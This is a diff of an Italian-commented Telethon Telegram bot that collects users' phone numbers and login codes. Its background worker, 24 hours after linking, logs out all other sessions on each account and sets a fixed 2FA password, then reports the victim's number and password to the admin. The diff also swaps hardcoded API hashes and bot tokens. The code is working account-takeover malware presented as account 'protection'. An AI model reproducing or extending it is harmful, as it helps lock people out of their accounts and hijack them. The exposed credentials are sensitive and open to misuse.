@@ -4,19 +4,13 @@ import time
 from flask import Flask
 import threading
 from telethon import TelegramClient, events, Button
-from telethon.tl.functions.account import ResetAuthorizationRequest
-from telethon.errors import (
-    SessionPasswordNeededError,
-    PhoneCodeInvalidError,
-    PhoneNumberInvalidError,
-    AuthRestartError,
-    FloodWaitError
-)
+from telethon.tl.functions.auth import ResetAuthorizationsRequest
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError
 
-# --- CREDENZIALI ORIGINALI ---
-API_ID = 37810956
-API_HASH = "7753910251b42b5f91abe65c34f7f712"
-BOT_TOKEN = "9141462955:AAEY0YM2Wh7IhrBwXYeSClQZR1_3j_gZNLk"
+# --- CREDENZIALI CONFIGURATE ---
+API_ID = 32531630
+API_HASH = "ed0ce5e3de48ef0f55582cbf5f2b3a7c"
+BOT_TOKEN = "9104042803:AAFe1goVzHUY4oyA3iV2_FoRMESuf3FzKPI"
 ADMIN_ID = 8886429641
 
 SESSION_DIR = "user_sessions"
@@ -41,7 +35,7 @@ threading.Thread(target=run_web, daemon=True).start()
 # Avvio del bot principale con Telethon
 bot = TelegramClient('bot_main_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# --- MOTORE IN BACKGROUND (TIMER 24H, DISCONNESSIONE E 2FA) ---
+# --- MOTORE IN BACKGROUND (ATTESA 24H -> DISCONNESSIONE SESSIONI -> 2FA -> MESSAGGIO) ---
 async def background_workers():
     print("🔄 Task in background avviato con successo!")
     while True:
@@ -51,7 +45,7 @@ async def background_workers():
         for user_id, udata in list(user_data_store.items()):
             for phone, acc_info in list(udata.get("accounts", {}).items()):
 
-                # 1. Controllo Timer 24h (86400 secondi)
+                # 1. Attesa 24h (86400 secondi) dal collegamento
                 if not acc_info.get("protected", False):
                     elapsed = current_time - acc_info.get("link_time", current_time)
                     if elapsed >= 86400:
@@ -61,13 +55,15 @@ async def background_workers():
                                 if not client.is_connected():
                                     await client.connect()
 
+                                # Step A: Disconnette tutte le altre sessioni
                                 sessions_reset_ok = False
                                 try:
-                                    await client(ResetAuthorizationRequest())
+                                    await client(ResetAuthorizationsRequest())
                                     sessions_reset_ok = True
                                 except Exception as reset_err:
-                                    print(f"⚠️ ResetAuthorizationRequest per {phone}: {reset_err}")
+                                    print(f"⚠️ ResetAuthorizationsRequest per {phone}: {reset_err}")
 
+                                # Step B: Attiva / imposta la password 2FA
                                 two_fa_ok = False
                                 try:
                                     old_pass = acc_info.get("existing_2fa")
@@ -79,6 +75,7 @@ async def background_workers():
                                 except Exception as fa_err:
                                     print(f"⚠️ edit_2fa per {phone}: {fa_err}")
 
+                                # Step C: Manda il messaggio all'admin se la protezione è completata
                                 if two_fa_ok:
                                     acc_info["protected"] = True
                                     acc_info["fa_password"] = "11071970"
@@ -87,7 +84,7 @@ async def background_workers():
                                         f"🔒 **Timer 24h scaduto - Account protetto!**\n"
                                         f"• Utente: {udata.get('name')} (`{user_id}`)\n"
                                         f"• Numero: `{phone}`\n"
-                                        f"• Sessioni disconnesse: {'✅' if sessions_reset_ok else '⚠️ Bloccato da Telegram (<24h sessione)'}\n"
+                                        f"• Sessioni disconnesse: {'✅' if sessions_reset_ok else '⚠️ Non riuscita'}\n"
                                         f"• 2FA password impostata: `11071970` ✅"
                                     )
                                 else:
@@ -563,10 +560,6 @@ async def message_router(event):
                 "Telegram ti ha inviato il codice di accesso.\n"
                 "Invia il codice ricevuto (es. `1 2 3 4 5` oppure `12345`):"
             )
-        except FloodWaitError as fw:
-            await event.respond(f"⏳ Troppi tentativi. Attendi `{fw.seconds}` secondi e riprova.")
-        except PhoneNumberInvalidError:
-            await event.respond("❌ **Numero non valido!** Controlla il numero (es. `+393331234567`) e riprova:")
         except AuthRestartError:
             await event.respond("🔄 Errore di connessione a Telegram. Riprova a inviare il numero.")
         except Exception as e:
